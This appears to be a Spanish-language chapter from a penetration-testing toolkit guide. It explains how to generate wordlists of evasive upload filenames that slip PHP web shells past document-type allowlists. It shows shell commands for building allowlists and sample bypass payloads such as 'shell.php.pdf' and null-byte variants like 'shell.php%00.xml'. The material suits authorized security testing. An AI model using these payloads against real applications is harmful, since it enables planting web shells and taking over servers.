# 03 - Extensiones permitidas personalizadas

## Objetivo

Generar filenames evasivos cuando la allowlist de la aplicación no es la típica de imágenes.

Ejemplos:

```text
.pdf
.zip
.svg
.xml
.docx
.xlsx
```

## Cuándo usarlo

Usa este perfil cuando:

```text
[ ] El formulario acepta documentos o formatos específicos
[ ] El frontend usa accept=".pdf,.zip,.svg"
[ ] El backend rechaza imágenes pero acepta otros formatos
[ ] Quieres mantener separada la allowlist real del objetivo
```

## Crear allowlist custom

```bash
cd /opt/fileUpload
cat > wordlists/generated/allowed_docs_svg_zip.txt <<'EOF_ALLOWED'
.pdf
.zip
.svg
.xml
.docx
.xlsx
EOF_ALLOWED
```

## Generar PHP contra esa allowlist

```bash
bin/gen_filename_wordlist.sh \
  wordlists/custom/php_exts.txt \
  wordlists/generated/php_against_docs_svg_zip.txt \
  wordlists/generated/allowed_docs_svg_zip.txt
```

## Salida esperada

```text
wordlists/generated/php_against_docs_svg_zip.txt
```

## Ejemplos de filenames generados

```text
shell.php.pdf
shell.pdf.php
shell.phtml.zip
shell.zip.phtml
shell.phar.svg
shell.svg.phar
shell.php%00.xml
shell.xml%00.php
shell.phtml%0a.docx
shell.xlsx%20.phar
```

## Leerlo como producto cartesiano

Con:

```text
Dangerous = [.php, .phtml, .phar, ...]
Allowed   = [.pdf, .zip, .svg, .xml, .docx, .xlsx]
Chars     = [%20, %0a, %00, ...]
```

el script genera combinaciones en varios patrones:

```text
shell{dangerous}{allowed}
shell{allowed}{dangerous}
shell{dangerous}{char}{allowed}
shell{allowed}{char}{dangerous}
```

## Variante: solo SVG/XML

Si quieres centrarte en formatos XML-like:

```bash
cat > wordlists/generated/allowed_xmlish.txt <<'EOF_ALLOWED'
.svg
.xml
EOF_ALLOWED

bin/gen_filename_wordlist.sh \
  wordlists/custom/php_exts.txt \
  wordlists/generated/php_against_xmlish.txt \
  wordlists/generated/allowed_xmlish.txt
```
